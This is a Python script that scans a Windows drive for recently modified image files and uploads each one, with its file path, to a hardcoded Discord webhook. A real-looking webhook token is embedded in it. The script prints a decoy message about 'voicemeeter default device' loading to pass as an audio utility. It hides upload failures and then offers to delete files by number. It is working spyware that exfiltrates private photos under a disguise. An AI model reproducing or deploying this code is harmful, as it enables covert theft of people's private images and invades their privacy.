import os
import time
import requests
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1441168746248142889/WRJveZ9l89qoPozRN2KWwwiqsP_7-EXp68Mx0bDJtI8O152rd4fySDIH3tXjMSqUT8WS"
IMAGE_EXT = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'}
MAX_SIZE = 5 * 1024 * 1024

sent_images = []


def send_image(file_path: Path, num: int):
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                WEBHOOK_URL,
                data={"content": f"**Image #{num}**\n**Path:** `{file_path}`"},
                files={"file": (file_path.name, f)}
            )
        print(f"Sent #{num}: {file_path}")
    except:
        pass


def delete_by_number(num: int):
    if 1 <= num <= len(sent_images):
        path = sent_images[num - 1]
        try:
            os.remove(path)
            print(f"Deleted #{num}: {path}")
        except Exception as e:
            print(f"Failed to delete #{num}: {e}")
    else:
        print(f"Invalid number: {num}")


def scan_drive(drive: str = "D", days: int = 2):
    global sent_images
    sent_images = []

    cutoff = time.time() - (days * 24 * 60 * 60)
    root_path = Path(f"{drive.upper()}:/")

    if not root_path.exists():
        print(f"Drive {drive.upper()}: not found")
        return

    print("voicemeeter default device loding")
    print("Scanning...")

    counter = 0
    for current_root, dirs, files in os.walk(root_path):
        dirs[:] = [d for d in dirs if d not in {'$RECYCLE.BIN', 'System Volume Information', 'Recovery'} and not d.startswith('$')]

        for file in files:
            try:
                fp = Path(current_root) / file
                if fp.suffix.lower() not in IMAGE_EXT:
                    continue
                if fp.stat().st_size > MAX_SIZE:
                    continue
                if fp.stat().st_mtime < cutoff:
                    continue

                counter += 1
                sent_images.append(str(fp))
                send_image(fp, counter)
                time.sleep(0.4)
            except:
                continue

    print("\nScan completed.")
    print(f"Total images sent: {len(sent_images)}")

    if not sent_images:
        return

    print("but device input number")

    while True:
        try:
            inp = input("\nEnter number to delete (q to quit): ").strip()
            if inp.lower() == 'q':
                break
            num = int(inp)
            delete_by_number(num)
        except ValueError:
            print("Enter a valid number or 'q'")
        except KeyboardInterrupt:
            print("\nExited.")
            break